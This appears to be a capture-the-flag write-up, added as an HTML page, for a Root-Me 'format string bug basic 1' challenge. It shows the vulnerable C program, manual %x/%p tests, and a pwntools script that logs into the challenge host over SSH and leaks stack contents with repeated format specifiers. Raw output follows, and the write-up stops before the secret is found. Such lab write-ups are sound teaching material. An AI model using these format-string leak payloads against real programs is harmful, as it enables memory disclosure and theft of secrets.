@@ -1,0 +1,265 @@
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/default.min.css">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/highlight.min.js"></script>
+
+<div style="background-color: #f471ad; padding: 10px; border: 10px ridge lightgreen;">
+  <h1 id="elf-x86-format-string-bug-basic-1">ELF x86 - Format string bug basic 1</h1>
+  <h2 id="source-code">Source code</h2>
+  <p>Here is the code source</p>
+  <pre><code class="lang-c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span
+          class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
+      <span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span
+          class="hljs-meta-string">&lt;unistd.h&gt;</span></span>
+
+      <span class="hljs-keyword">int</span> main(<span class="hljs-keyword">int</span> argc, <span
+        class="hljs-keyword">char</span> *argv[]){
+      FILE *secret = fopen(<span class="hljs-string">"/challenge/app-systeme/ch5/.passwd"</span>, <span
+        class="hljs-string">"rt"</span>);
+      <span class="hljs-keyword">char</span> <span class="hljs-built_in">buffer</span>[<span
+        class="hljs-number">32</span>];
+      fgets(<span class="hljs-built_in">buffer</span>, <span class="hljs-keyword">sizeof</span>(<span
+        class="hljs-built_in">buffer</span>), secret);
+      printf(argv[<span class="hljs-number">1</span>]);
+      fclose(secret);
+      <span class="hljs-built_in">return</span> <span class="hljs-number">0</span>;
+      }
+    </code></pre>
+  <h2 id="analyze">Analyze</h2>
+  <p>So, in this challenge we can quickly sort what is relevant and what isn&#39;t.
+    The program reads the <code>.passwd</code> file and stores its content in a 32 char array, next it prints the first
+    argument passed to the main function and exits.
+    At first glance the <code>printf</code> is very suspicious, after a quick search on google we understand the goal.
+    This <code>printf</code> is badly formatted, it prints <code>argv[i]</code> without any format specifier, which
+    allow us to use format strings to explore the stack.</p>
+  <h2 id="exploitation">Exploitation</h2>
+  <p>Here is my firsts tests:</p>
+  <pre><code class="lang-bash">app-systeme-ch5<span class="hljs-variable">@challenge02</span><span
+        class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>./ch5 %s
+      Segmentation fault
+      app-systeme-ch5<span class="hljs-variable">@challenge02</span><span class="hljs-symbol">:~</span><span
+        class="hljs-variable">$ </span>./ch5 %x
+      <span class="hljs-number">20</span>
+      app-systeme-ch5<span class="hljs-variable">@challenge02</span><span class="hljs-symbol">:~</span><span
+        class="hljs-variable">$ </span>./ch5 %p
+      <span class="hljs-number">0x20</span>
+    </code></pre>
+  <p>We managed to trigger the long-awaited segfault, and format specifiers like %x or %p now print values.
+    Now, if I try using a sequence of format specifiers:</p>
+  <pre><code class="lang-bash">app-systeme-ch<span class="hljs-number">5</span>@challe<span
+        class="hljs-symbol">nge02</span>:~$ ./ch<span class="hljs-number">5</span> <span
+        class="hljs-meta">%</span>p_<span class="hljs-meta">%</span>p_<span class="hljs-meta">%</span>p_<span
+        class="hljs-meta">%</span>p_<span class="hljs-meta">%</span>p
+      <span class="hljs-number">0</span>x<span class="hljs-number">20</span>_<span class="hljs-number">0</span>x<span
+        class="hljs-number">804</span>b<span class="hljs-number">160</span>_<span class="hljs-number">0</span>x<span
+        class="hljs-number">804853</span>d_<span class="hljs-number">0</span>x<span class="hljs-number">9</span>_<span
+        class="hljs-number">0</span>xbffffd<span class="hljs-number">35</span>
+    </code></pre>
+  <p>We can clearly see different values being printed — these are the contents of our stack.
+    Great! Now all I have left to do is find the contents of the <code>.passwd</code> file.
+    To do that, I wrote a script that prints the entire stack and automatically formats any strings when possible.</p>
+  <pre><code class="lang-py">from pwn <span class="hljs-built_in">import</span> *
+
+      <span class="hljs-attr">s</span> = pwnlib.tubes.ssh.ssh(<span class="hljs-attr">user="app-systeme-ch5",</span>
+      <span class="hljs-attr">host="challenge02.root-me.org",</span> <span class="hljs-attr">port=2222,</span> <span
+        class="hljs-attr">password="app-systeme-ch5")</span>
+
+      <span class="hljs-attr">payload</span> = <span class="hljs-string">""</span>
+      for i <span class="hljs-keyword">in</span> range(<span class="hljs-number">100</span>):
+      payload += <span class="hljs-string">"_%s"</span>
+      <span class="hljs-attr">payload_full</span> = f<span class="hljs-string">"./ch5 {payload}"</span>
+      <span class="hljs-attr">r</span> = repr(s(payload_full))
+      <span class="hljs-keyword">if</span> <span class="hljs-string">"Segmentation fault"</span> <span
+        class="hljs-keyword">in</span> r:
+      <span class="hljs-attr">payload</span> = payload[:-<span class="hljs-number">3</span>] + <span
+        class="hljs-string">"_%p"</span>
+
+      <span class="hljs-attr">r</span> = s(payload_full).decode('latin-<span class="hljs-number">1</span>')
+      print(r)
+      print(<span class="hljs-string">"====="</span>)
+      print(payload_full)
+    </code></pre>
+  <p>Here is what we get after running it.</p>
+  <pre><code class="lang-bash">[*] Closed SSH channel with challenge02.root-me.org
+      _0x20_$­ûÎ²\x04\x08Î²\x04\x08À²\x04\x08À²\x04\x08À²\x04\x08À²\x04\x08À²\x04\x08ÀÂ\x04\x08_ÃÃ\x1a_0x9_./ch5_Ãy\x1a_®üÿ¿´üÿ¿_}\x1d_}\x1d_$­ûÎ²\x04\x08Î²\x04\x08À²\x04\x08À²\x04\x08À²\x04\x08À²\x04\x08À²\x04\x08ÀÂ\x04\x08_0x39617044_0x28293664_0x6d617045_0xbf000a64_Ç\x01Ä\x109þuãÄ\x0c[^_]Ãv_0x2_®üÿ¿´üÿ¿_áýÿ¿<span
+        class="hljs-number">7</span>þÿ¿<span class="hljs-keyword">J</span>þÿ¿_þÿ¿~þÿ¿þÿ¿Øþÿ¿ëþÿ¿
+      ÿÿ¿\x15ÿÿ¿%ÿÿ¿-ÿÿ¿Eÿÿ¿<span
+        class="hljs-keyword">d</span>ÿÿ¿Ìÿÿ¿Ôÿÿ¿_0x88b7bd00_\x02_(null)_(null)_Ä\x10ì\x0cPèóu\x01_}\x1d_}\x1d_(null)_Ä\x10ì\x0cPèóu\x01_0x2_®üÿ¿´üÿ¿_áýÿ¿<span
+        class="hljs-number">7</span>þÿ¿<span class="hljs-keyword">J</span>þÿ¿_þÿ¿~þÿ¿þÿ¿Øþÿ¿ëþÿ¿
+      ÿÿ¿\x15ÿÿ¿%ÿÿ¿-ÿÿ¿Eÿÿ¿<span class="hljs-keyword">d</span>ÿÿ¿Ìÿÿ¿Ôÿÿ¿__0x1_(null)_}\x1d_Çæ<span
+        class="hljs-keyword">x</span>\x01_4o\x02_(null)_}\x1d_(null)_(null)_0xc7fc4876_0xf8376e66_(null)_(null)_(null)_0x2_1í^áäðPTRè#_(null)_Z\x0c$\x04<span
+        class="hljs-built_in">$D</span>$\x04Â\x0c_UåWVè<span class="hljs-number">9</span>¿_\x14\x04\x08@ùÿ·ÐÍþ·
+      ¥ã·_0x2_1í^áäðPTRè#_(null)_ô\x1c$ÃffffóÃfffffff\x1c$Ãffffff¸, \x04\x08=, \x04\x08t$¸_L$\x04äðÿ<span
+        class="hljs-keyword">q</span>üUåSQì@è#ÿÿÿÃÃ\x1a_0x2_®üÿ¿´üÿ¿_UWVSèþÿÿÃ'\x1a_óÃfffffffSè\x1aþÿÿÃº\x19_UåWVè<span
+        class="hljs-number">9</span>¿_@ùÿ·\x02__0x2_./ch5__<span class="hljs-built_in">%p</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%p</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%p</span>_<span
+        class="hljs-built_in">%p</span>_<span class="hljs-built_in">%p</span>_<span
+        class="hljs-built_in">%p</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%p</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%p</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%p</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%p</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%p</span>_<span
+        class="hljs-built_in">%p</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%p</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%p</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%p</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%p</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%p</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%p</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%p</span>_<span
+        class="hljs-built_in">%p</span>_<span class="hljs-built_in">%p</span>_<span
+        class="hljs-built_in">%p</span>_<span class="hljs-built_in">%p</span>_<span
+        class="hljs-built_in">%p</span>_<span class="hljs-built_in">%p</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%p</span>_<span
+        class="hljs-built_in">%p</span>_<span class="hljs-built_in">%p</span>_<span
+        class="hljs-built_in">%s</span>_(null)_SSH_CONNECTION=<span class="hljs-number">2</span>a01:e0a:<span
+        class="hljs-number">209</span>:e000:<span class="hljs-number">9</span>c84:<span
+        class="hljs-number">96</span>c6:<span class="hljs-number">841</span>a:c6e6 <span
+        class="hljs-number">53818</span> <span class="hljs-number">2001</span>:bc8:<span
+        class="hljs-number">35</span>b0:c166::<span class="hljs-number">152</span> <span
+        class="hljs-number">22</span>_XDG_SESSION_ID=<span
+        class="hljs-number">353</span>_USER=app-systeme-ch5_PWD=/challenge/app-systeme/ch5_HOME=/challenge/app-systeme/ch5_SSH_CLIENT=<span
+        class="hljs-number">2</span>a01:e0a:<span class="hljs-number">209</span>:e000:<span
+        class="hljs-number">9</span>c84:<span class="hljs-number">96</span>c6:<span class="hljs-number">841</span>a:c6e6
+      <span class="hljs-number">53818</span> <span class="hljs-number">22</span>_SSH_TTY=/dev/pts/<span
+        class="hljs-number">2</span>_MAIL=/var/mail/app-systeme-ch5_TERM=xterm_SHELL=/bin/bash_SHLVL=<span
+        class="hljs-number">1</span>_bash: line <span class="hljs-number">1</span>: <span
+        class="hljs-number">12033</span> Segmentation fault ./ch5 _<span class="hljs-built_in">%p</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%p</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%p</span>_<span
+        class="hljs-built_in">%p</span>_<span class="hljs-built_in">%p</span>_<span
+        class="hljs-built_in">%p</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%p</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%p</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%p</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%p</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%p</span>_<span
+        class="hljs-built_in">%p</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%p</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%p</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%p</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%p</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%p</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%p</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%p</span>_<span
+        class="hljs-built_in">%p</span>_<span class="hljs-built_in">%p</span>_<span
+        class="hljs-built_in">%p</span>_<span class="hljs-built_in">%p</span>_<span
+        class="hljs-built_in">%p</span>_<span class="hljs-built_in">%p</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%p</span>_<span
+        class="hljs-built_in">%p</span>_<span class="hljs-built_in">%p</span>_<span class="hljs-built_in">%s</span>
+      =====
+      ./ch5 _<span class="hljs-built_in">%p</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%p</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%p</span>_<span class="hljs-built_in">%p</span>_<span
+        class="hljs-built_in">%p</span>_<span class="hljs-built_in">%p</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%p</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%p</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%p</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%p</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%p</span>_<span class="hljs-built_in">%p</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%p</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%p</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%p</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%p</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%s</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%p</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%p</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%p</span>_<span class="hljs-built_in">%p</span>_<span
+        class="hljs-built_in">%p</span>_<span class="hljs-built_in">%p</span>_<span
+        class="hljs-built_in">%p</span>_<span class="hljs-built_in">%p</span>_<span
+        class="hljs-built_in">%p</span>_<span class="hljs-built_in">%s</span>_<span
+        class="hljs-built_in">%p</span>_<span class="hljs-built_in">%p</span>_<span
+        class="hljs-built_in">%p</span>_<span class="hljs-built_in">%s</span>
+    </code></pre>
+  <p>We see a lot of gibberish, but we can see the presence of environment variables (PWD, USER, etc.). However, there’s
+    no readable trace of the contents of our .passwd file.
+    After some necessary thinking, it becomes clear that the file’s contents can’t be located directly on the stack,
+    it’s too dynamic, and more importantly, the code clearly uses a pointer.
+    So our target must be in the heap.</p>
+  <img src="/images/gifs/tobecontinued.gif">
+
+</div>
+
+<script>hljs.highlightAll();</script>
